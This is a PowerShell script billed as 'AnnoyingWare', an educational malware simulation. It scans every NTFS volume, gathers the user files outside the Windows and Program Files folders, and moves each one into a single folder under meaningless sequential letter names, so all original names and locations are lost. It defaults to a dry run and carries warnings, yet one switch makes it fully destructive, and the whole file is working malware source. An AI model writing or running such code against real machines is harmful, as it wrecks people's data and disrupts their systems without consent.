# AnnoyingWare - Educational malware simulation
# WARNING: This script is for educational purposes only!
# It renames and moves files across all volumes into a single annoying folder

function Get-NextFileName {
    param([int]$index)
    
    $letters = 'abcdefghijklmnopqrstuvwxyz'
    $result = ""
    
    do {
        $result = $letters[$index % 26] + $result
        $index = [Math]::Floor($index / 26) - 1
    } while ($index -ge 0)
    
    return $result
}

function Find-AllVolumes {
    $volumes = Get-Volume | Where-Object { $_.DriveLetter -and $_.FileSystemType -eq 'NTFS' }
    return $volumes.DriveLetter
}

function Start-AnnoyingWare {
    param(
        [string]$TargetVolume = "C",
        [switch]$DryRun = $true
    )
    
    Write-Host "[!] AnnoyingWare Starting..." -ForegroundColor Red
    Write-Host "[!] DryRun Mode: $DryRun" -ForegroundColor Yellow
    
    # Create the annoying directory
    $annoyingPath = "$($TargetVolume):\annoying"
    
    if (-not (Test-Path $annoyingPath)) {
        if ($DryRun) {
            Write-Host "[DRY RUN] Would create: $annoyingPath" -ForegroundColor Cyan
        } else {
            New-Item -Path $annoyingPath -ItemType Directory -Force | Out-Null
            Write-Host "[+] Created: $annoyingPath" -ForegroundColor Green
        }
    }
    
    # Find all volumes
    Write-Host "`n[*] Scanning volumes..." -ForegroundColor Yellow
    $volumes = Find-AllVolumes
    Write-Host "[*] Found volumes: $($volumes -join ', ')" -ForegroundColor Yellow
    
    # Collect all files from all volumes
    $allFiles = @()
    foreach ($volume in $volumes) {
        Write-Host "`n[*] Scanning ${volume}:\" -ForegroundColor Yellow
        try {
            $files = Get-ChildItem -Path "${volume}:\" -Recurse -File -ErrorAction SilentlyContinue | 
                     Where-Object { $_.FullName -notlike "*\annoying\*" -and $_.FullName -notlike "*\Windows\*" -and $_.FullName -notlike "*\Program Files*" }
            $allFiles += $files
            Write-Host "[*] Found $($files.Count) files on ${volume}:" -ForegroundColor Yellow
        } catch {
            Write-Host "[!] Error scanning ${volume}: $_" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[*] Total files to process: $($allFiles.Count)" -ForegroundColor Yellow
    Write-Host "`n[*] Starting file renaming and moving..." -ForegroundColor Yellow
    
    # Rename and move files
    $index = 0
    $processed = 0
    $errors = 0
    
    foreach ($file in $allFiles) {
        $newName = Get-NextFileName -index $index
        $extension = $file.Extension
        $newFileName = "$newName$extension"
        $newPath = Join-Path $annoyingPath $newFileName
        
        # Handle duplicates
        $counter = 1
        while (Test-Path $newPath) {
            $newFileName = "${newName}_${counter}${extension}"
            $newPath = Join-Path $annoyingPath $newFileName
            $counter++
        }
        
        try {
            if ($DryRun) {
                if ($processed -lt 10) {
                    Write-Host "[DRY RUN] Would move: $($file.FullName) -> $newPath" -ForegroundColor Cyan
                }
            } else {
                Move-Item -Path $file.FullName -Destination $newPath -Force
                Write-Host "[+] Moved: $($file.Name) -> $newFileName" -ForegroundColor Green
            }
            $processed++
        } catch {
            $errors++
            if ($errors -lt 10) {
                Write-Host "[!] Error moving $($file.FullName): $_" -ForegroundColor Red
            }
        }
        
        $index++
        
        # Progress indicator
        if ($processed % 100 -eq 0) {
            Write-Host "[*] Progress: $processed files processed..." -ForegroundColor Yellow
        }
    }
    
    Write-Host "`n[*] AnnoyingWare Complete!" -ForegroundColor Green
    Write-Host "[*] Files processed: $processed" -ForegroundColor Green
    Write-Host "[*] Errors: $errors" -ForegroundColor Red
    Write-Host "[*] All files moved to: $annoyingPath" -ForegroundColor Green
}

# Main execution
Write-Host @"
╔═══════════════════════════════════════════════════════════╗
║              ANNOYINGWARE - EDUCATIONAL ONLY              ║
║  This script demonstrates malicious file manipulation    ║
║  DO NOT RUN ON PRODUCTION SYSTEMS                        ║
╚═══════════════════════════════════════════════════════════╝
"@ -ForegroundColor Red

Write-Host "`nUsage Examples:" -ForegroundColor Yellow
Write-Host "  Dry Run (safe):  Start-AnnoyingWare -DryRun" -ForegroundColor Cyan
Write-Host "  Execute (DANGER): Start-AnnoyingWare -DryRun:`$false -TargetVolume 'C'" -ForegroundColor Cyan
Write-Host "`n[!] Script loaded. Run 'Start-AnnoyingWare' to begin (defaults to DryRun mode)`n" -ForegroundColor Yellow
